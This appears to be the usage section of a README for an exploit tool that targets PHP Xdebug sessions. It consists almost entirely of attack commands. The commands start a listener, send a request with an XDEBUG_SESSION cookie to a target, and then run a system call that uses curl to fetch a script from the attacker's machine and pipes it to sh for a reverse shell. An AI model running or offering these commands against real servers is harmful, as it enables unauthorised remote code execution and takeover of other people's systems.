# Usage
```
-->> start listener
python3 XDEBUG_SESSION.py

-->> attack XDEBUG_SESSION
curl http://$TARGET -H "Cookie: XDEBUG_SESSION="

-->> execute commands
python_cmd >> system("curl $MYIP:8888/resh|sh")
```
